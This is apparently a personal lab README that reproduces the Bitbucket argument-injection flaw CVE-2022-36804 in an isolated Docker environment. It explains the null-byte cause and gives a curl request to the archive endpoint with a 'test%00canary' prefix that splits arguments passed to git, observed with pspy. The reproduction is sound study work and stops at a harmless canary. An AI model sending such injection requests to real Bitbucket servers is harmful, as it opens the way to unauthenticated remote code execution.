# Docker container to investigate CVE-2022-36804
*Recreating remote code execution vulnerability where Bitbucket fails to sanitize user input, which allows attackers to inject Git flags and execute code remotely.*

This repository documents how I reproduced the vulnerability CVE-2022-36804, an issue with pre-authentication argument injection in Bitbucket. The goal of this lab was to demonstrate the underlying security issue as described in Assetnote's write-up. All testing was performed in an isolated environment. 

## Overview
CVE-2022-36804 is caused by Bitbucket passing user input directly into a git archive subprocess without sanitizing null bytes. Because Bitbucket uses NuProcess to spawn git, null bytes are preserved and cause argument splitting. This allows an attacker to inject extra git flags into the command. In vulnerable versions (such as 7.21.0 as used in this set up) this leads to remote code execution without any authentication.

## Lab setup
- Bitbucket version 7.21.0
- Deployment: Docker Compose 
- Repository: public test redo ('TEST/demo')
- Host: local isolated lab environment

To start the environment:
~~~
docker compose up -d
~~~

Verify version: 
~~~
cat /opt/atlassian/bitbucket/VERSION
~~~

## Demonstrating the vulnerability 

The image below shows how pspy running inside the Bitbucket Docker container calling ` /usr/bin/git archive --format=zip --prefix=test canary/ -- ` (PID=666). What was sent as one value - ` test%00canary ` - is passed as two separate arguments. The null byte split the input which sneaks an extra argument into the git command.

<img width="1870" height="792" alt="Skärmbild 2026-03-30 191936" src="https://github.com/user-attachments/assets/860fa4b1-5b73-47f8-9afc-14f6f201b882" />

### Detailed steps
The key to this CVE is showing that a null byte in the prefix parameter causes Bitbucket to pass multiple arguments to git archive. 

1. Run pspy inside the Bitbucket container

~~~
docker exec -it bitbucket bash
cd /tmp
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64
./pspy64
~~~
Leave pspy running. 

2. Trigger the vulnerable endpoint
from host: 
~~~
curl "http://localhost:7990/rest/api/latest/projects/TEST/repos/demo/archive?prefix=test%00canary&format=zip"
~~~
This payload tests argument splitting.

3. Observe the injected arguments
In pspy Bitbucket generates:
~~~
/usr/bin/git archive --format=zip --prefix=test canary/ -- 
~~~
Here test and canary appear as separate arguments, both forwards to git which demonstrates that the null byte (`%00 `) successfully terminated the original parameter causing Bitbucket to pass multiple independent arguments to the underlying git archive process.


## References 
* Assetnote: Bitbucket pre-auth rce via git argument injection
  - https://www.assetnote.io/resources/research/breaking-bitbucket-pre-auth-remote-command-execution-cve-2022-36804
* CVE-2022-36804

## Author
Johan -
Stockholm, Sweden 
